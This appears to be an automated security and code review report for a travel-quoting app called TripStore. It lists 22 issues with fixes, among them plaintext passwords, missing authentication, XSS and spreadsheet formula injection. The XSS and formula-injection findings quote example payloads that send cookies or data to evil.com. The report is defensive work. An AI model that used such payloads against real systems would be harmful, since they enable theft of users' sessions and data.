# TripStore Code Review Report
**Date:** 2026-06-08
**Reviewer:** Automated Daily Review
**Files Reviewed:** Code.gs, Pipeline.gs, Quote_Intelligence.gs, index_fit.tripstore.html, write_to_sheets.py, archive_to_input.py
**Files Not Found (not in repo):** extract_itineraries.py, write_inputs_to_sheets.py, cleanup_sheet.py, clean_pipeline_data.py, cross_reference.py, enrich_hotels.py, enrich_hotels_booking.py

---

## Summary

| Severity | Count |
|----------|-------|
| CRITICAL | 5 |
| MODERATE | 10 |
| MINOR | 7 |
| **TOTAL** | **22** |

---

## CRITICAL Issues

### C1 — Plaintext Passwords in Google Sheet (Code.gs, line 261)
**File:** Code.gs — `checkLogin()`, line 261
**Issue:** Passwords are stored and compared in plaintext. `dbPass === pass.trim()` is a direct string match against the raw value in the Users sheet.
**Risk:** If the spreadsheet is shared, exported, or accessed by another collaborator or script, all agent passwords are immediately visible.
**Fix:** At minimum, use a deterministic hash (e.g. SHA-256 via Utilities.computeDigest in Apps Script) before storing and comparing. Proper fix is a separate auth provider.

---

### C2 — Login Credentials Sent via GET URL (Code.gs, doGet, line 26)
**File:** Code.gs — `doGet()`, line 26
**Issue:** The `checkLogin` action is handled by `doGet`, meaning username and password can be passed as query parameters: `?action=checkLogin&user=xxx&pass=yyy`. Query parameters appear in server access logs, browser history, CDN logs, and referrer headers.
**Note:** The frontend currently sends login via POST (correct), but the `doGet` handler still allows GET-based login — any direct URL call leaks credentials in the URL.
**Fix:** Remove `checkLogin` from `doGet`. Handle it exclusively in `doPost`.

---

### C3 — Admin Role Enforced Only in UI, Not Server-Side (index_fit.tripstore.html, lines 586–588)
**File:** index_fit.tripstore.html — `checkLogin()`, lines 586–588
**Issue:** The admin flag is stored in `localStorage` after login: `localStorage.setItem("tripstore_session", JSON.stringify(session))`. On reload, `checkAutoLogin()` reads this flag and unlocks the admin panel without re-verifying with the server. Any user can open browser DevTools, set `tripstore_session.isAdmin = true` in localStorage, and get full admin panel access.
**Risk:** Admin panel allows loading any saved itinerary by pax name. A malicious agent could exfiltrate all client data.
**Fix:** Re-verify admin role on every protected API call server-side in Code.gs, not just in the browser.

---

### C4 — Master Data API Requires No Authentication (Code.gs, line 65 / index_fit.tripstore.html, line 683)
**File:** Code.gs — `getData()`, line 65
**Issue:** `?action=getData` (the default) returns all hotels, sightseeing, transfers, and intercity pricing with no authentication check. The API_URL is hardcoded in the public HTML source. Anyone who finds that URL can download the entire master pricing database.
**Risk:** Competitors can scrape all pricing data. This is a business-confidential dataset.
**Fix:** Add a shared `X-Auth-Token` script property check in `doGet`/`doPost`, or verify a session token passed by the frontend on every request.

---

### C5 — No Rate Limiting on Login — Brute Force Possible (Code.gs, line 249)
**File:** Code.gs — `checkLogin()`, line 249
**Issue:** There is no login attempt counter, lockout, or delay. An attacker can automate thousands of POST requests to the Apps Script URL to brute-force any agent password.
**Risk:** Combined with C1 (plaintext passwords), accounts can be compromised quickly.
**Fix:** Track failed attempts per username in Script CacheService. Lock the account after 5 failures for 30 minutes: `CacheService.getScriptCache().put('lockout_'+user, 'true', 1800)`.

---

## MODERATE Issues

### M1 — SPREADSHEET_ID Hardcoded in Python Scripts (write_to_sheets.py line 28, archive_to_input.py line 32)
**Files:** write_to_sheets.py line 28, archive_to_input.py line 32
**Issue:** `SPREADSHEET_ID = "1U3f6PhTpvbEO7JG937t2z9EW9dfB0gcIOUVA_GATIHM"` is hardcoded. If these files are shared or pushed to a public branch, the sheet ID is exposed and the sheet is accessible to anyone with the service account credentials.
**Fix:** Move to an environment variable: `SPREADSHEET_ID = os.environ.get("TRIPSTORE_SHEET_ID")` with a `.env` file excluded from git.

---

### M2 — `getAllSaved` and `searchItinerary` Require No Auth (Code.gs, lines 299–334)
**File:** Code.gs — `getAllSaved()` line 299, `searchItinerary()` line 321
**Issue:** Both functions are callable by anyone who knows the API URL. `getAllSaved()` returns the full client name list. `searchItinerary()` returns the entire saved JSON payload for any pax name — hotel selections, costs, travel dates.
**Fix:** Require a signed token or session secret in the request, verified against Script Properties server-side.

---

### M2b — XSS via Unescaped Server Data in innerHTML Templates (index_fit.tripstore.html, lines 1601, 1604, 1828)
**File:** index_fit.tripstore.html — hotel/transfer/sightseeing modal renderers
**Issue:** Hotel names, city names, tour names, and transfer route strings fetched from Google Sheets are interpolated directly into `innerHTML` template literals without HTML escaping:
```js
`<span class="...">${t.city || 'N/A'}</span>`   // line 1601
`<p class="...">${t.from} ➔ ${t.to}</p>`         // line 1604
`<div class="...">${h.name}</div>`                // line 1828
```
A sheet row containing `<img src=x onerror="fetch('https://evil.com?c='+document.cookie)">` as a hotel name would execute in every agent's browser when they open the picker modal. Note: the transfer modal has a partial `esc()` helper (line 1586) but it is only applied to `onclick` attribute values, not to rendered display text.
**Fix:** Apply a consistent escape helper to all rendered values:
```js
const esc = s => String(s||'').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
```

---

### M2c — Google Sheets Formula Injection via User Inputs (Code.gs, lines 289, 362)
**File:** Code.gs — `handleSignup()` line 289, `saveItinerary()` line 362
**Issue:** User-supplied values (username, paxName) are written to Google Sheets via `appendRow()` / `setValue()` without sanitisation. A pax name starting with `=` is treated as a live formula:
```
paxName = "=IMPORTXML(\"https://evil.com\",\"//a\")"
```
This executes when the sheet is opened, potentially exfiltrating data or corrupting rows.
**Fix:** Prefix any user-supplied string that starts with `=`, `+`, `-`, or `@` with a single quote before writing, forcing Sheets to treat it as text:
```js
function sanitizeForSheet(v) {
  const s = String(v||'').trim();
  return /^[=+\-@]/.test(s) ? "'" + s : s;
}
```

---

### M3 — Apps Script 6-Minute Execution Limit Risk (Pipeline.gs, lines 224–252)
**File:** Pipeline.gs — `processSheet()`, lines 224–252
**Issue:** The pipeline runs all 4 sheet types sequentially with `Utilities.sleep(1500)` between Claude batches. If many PENDING rows exist across sheets, the script will hit the 6-minute hard limit and terminate mid-run, leaving rows partially processed with no error recorded in the audit log.
**Fix:** Add a time guard inside the loop: `if ((new Date() - start) > 300000) { auditLog(ss, 'Time limit approaching — stopping early'); break; }` to exit gracefully before the limit.

---

### M4 — Claude JSON Parse Failure Silently Marks All Batch Rows as Error (Pipeline.gs, lines 587–597)
**File:** Pipeline.gs — `callClaudeAPI()`, lines 587–597
**Issue:** If Claude returns valid but structurally unexpected JSON (e.g. an object instead of an array, or extra prose before the JSON bracket), `JSON.parse(cleaned)` throws. The catch block marks every row in the batch as an error. This looks like bad data but is actually a parsing bug.
**Fix:** Use a regex to extract the JSON array first: `const match = cleaned.match(/\[[\s\S]*\]/); return JSON.parse(match ? match[0] : cleaned);` to be resilient to extra text around the JSON.

---

### M5 — `sheet_is_empty` Check Is Unreliable (write_to_sheets.py, line 168)
**File:** write_to_sheets.py — `main()`, line 168
**Issue:** `ws.row_count == 0` is always false — gspread's `row_count` returns the sheet's allocated row capacity (default 1000), not the number of rows with data. The fallback `not ws.get_all_values()` works but causes a redundant API call since `get_all_values()` is called again inside `build_existing_keys()`.
**Fix:** `all_values = ws.get_all_values(); sheet_is_empty = not all_values` — then pass `all_values` to `build_existing_keys` to avoid the duplicate call.

---

### M6 — Transfer City Parsing Is Brittle (archive_to_input.py, lines 154–162)
**File:** archive_to_input.py — `parse_transfers_cell()`, lines 154–162
**Issue:** City extraction uses a hardcoded regex split on known airport/station keywords. Multi-word cities with unexpected formats (e.g. "Munich Main Station", "Rome Fiumicino") may produce only the first word as the city or extract incorrectly, silently queuing bad data to INPUT_Transfers for Claude to reject.
**Fix:** Log a warning and skip the row if city extraction returns an empty string or single-character result, rather than queuing bad data.

---

### M7 — `logQuote` Has Unbounded Recursion Risk (Quote_Intelligence.gs, lines 33–37)
**File:** Quote_Intelligence.gs — `logQuote()`, lines 33–37
**Issue:** If `setupQuoteLog()` runs but the sheet is still missing afterward (e.g. quota error, permissions issue), `logQuote` calls itself again → `setupQuoteLog()` again → infinite recursion until Apps Script stack overflow. The save operation that called `logQuote` will then fail too.
**Fix:** Add a `retried` guard: `function logQuote(paxName, data, retried = false)` and `if (!logSheet) { if (retried) { Logger.log('Quote_Log missing after setup — skipping'); return; } setupQuoteLog(); return logQuote(paxName, data, true); }`.

---

### M8 — Full Pricing Dataset Fetched on Every Page Load — No Pagination (Code.gs, line 65)
**File:** Code.gs — `getData()`, line 65
**Issue:** Every app load fetches all hotels, sightseeing, transfers, and intercity data as one JSON blob. As master sheets grow, this payload will increase load time significantly and may eventually hit Apps Script response size limits (~10MB).
**Fix:** Return a city list on first load, then fetch per-city data on demand. Or cache the response in CacheService with a 1-hour TTL.

---

## MINOR Issues

### N1 — API_URL Hardcoded and Visible in Public HTML Source (index_fit.tripstore.html, line 426)
**File:** index_fit.tripstore.html, line 426
**Issue:** `const API_URL = "https://script.google.com/macros/s/AKfycby8..."` is visible to anyone who views source. This directly elevates CRITICAL issues C4/C5 since the attack surface is immediately discoverable.
**Note:** Rotating the URL requires redeployment and a HTML update every time.

---

### N2 — Raw Backend Error Messages Reflected to User (index_fit.tripstore.html, line 619)
**File:** index_fit.tripstore.html, line 619
**Issue:** `loginError.innerText = "❌ " + result` reflects the raw Apps Script response. Currently responses are controlled strings, but if a future code path throws an unhandled exception, a raw Apps Script stack trace would be shown to the user.
**Fix:** Whitelist acceptable error strings or show a generic fallback for unexpected values.

---

### N3 — `getHotels` Uses Hardcoded Column Index for Annual Avg (Code.gs, line 99)
**File:** Code.gs — `getHotels()`, line 99
**Issue:** `parsePrice(r[18])` uses a hardcoded column index for the Annual Avg column. If the sheet gains a new column before column S, all hotel prices silently break to ₹0.
**Fix:** Read the header row once and resolve column indices by name, not position.

---

### N4 — `getTransfers` Notes Field Reads Wrong Column / Misleading Comment (Code.gs, line 203)
**File:** Code.gs — `getTransfers()`, line 203
**Issue:** `notes: String(r[13] || '').trim(), // Column N: Schedule` — the comment says "Schedule" but the property is named `notes`. Column N (index 13) is "Schedule" and Column O (index 14) is "Notes". The property name and the actual data don't match.

---

### N5 — Sessions Never Expire (index_fit.tripstore.html, lines 641–652)
**File:** index_fit.tripstore.html — `checkAutoLogin()`, lines 641–652
**Issue:** Sessions persist in localStorage indefinitely with no expiry timestamp. A user logged in on a shared device 6 months ago remains auto-logged in.
**Fix:** Store `loginTime` in the session object. In `checkAutoLogin`, reject sessions older than 30 days.

---

### N6 — Transfers Duplicate Key Has Missing Fallback in `buildInputKey` (Pipeline.gs, lines 287 and 302)
**File:** Pipeline.gs — `buildMasterKey()` line 287, `buildInputKey()` line 302
**Issue:** `buildMasterKey` for transfers falls back to `row[7]` (From) if `row[8]` (To) is blank. But `buildInputKey` for transfers uses `data[XC.TO-1]` with no fallback. A transfer row where `To` is empty in the master would never match the input key, causing false duplicates to be added.
**Fix:** Add `|| (data[XC.FROM-1]||'').trim()` fallback to the transfers case in `buildInputKey`.

---

### N7 — Pipeline Summary Email Not Wrapped in Try/Catch (Pipeline.gs, line 708)
**File:** Pipeline.gs — `sendSummaryEmail()`, line 708
**Issue:** `GmailApp.sendEmail(email, subject, body)` throws if the daily Gmail send quota is exceeded. This unhandled exception propagates up and is logged as a pipeline failure even though all data processing completed successfully.
**Fix:** `try { GmailApp.sendEmail(email, subject, body); } catch(e) { auditLog(ss, 'Summary email failed: ' + e.message); }`

---

## Action Items (Priority Order)

1. **[C1]** Hash passwords before storing — implement SHA-256 via `Utilities.computeDigest` in Apps Script
2. **[C3]** Re-verify admin role server-side — don't trust localStorage for access control
3. **[C5]** Add login rate limiting — 5 attempts then 30-min lockout via `CacheService`
4. **[C2]** Remove `checkLogin` from `doGet` — GET params are logged by Google infrastructure
5. **[C4]** Add API auth token — shared secret in Script Properties as minimum protection
6. **[M7]** Fix recursion in `logQuote` — add `retried` guard immediately (low effort, high risk)
7. **[M3]** Add time guard in Pipeline.gs to prevent mid-run termination
8. **[M4]** Improve Claude JSON extraction — regex fallback for array extraction
9. **[N7]** Wrap `GmailApp.sendEmail` in try/catch — low effort, prevents false pipeline failures
10. **[M1]** Move `SPREADSHEET_ID` to env vars in both Python scripts

---

*Generated by automated daily review — 2026-06-07*
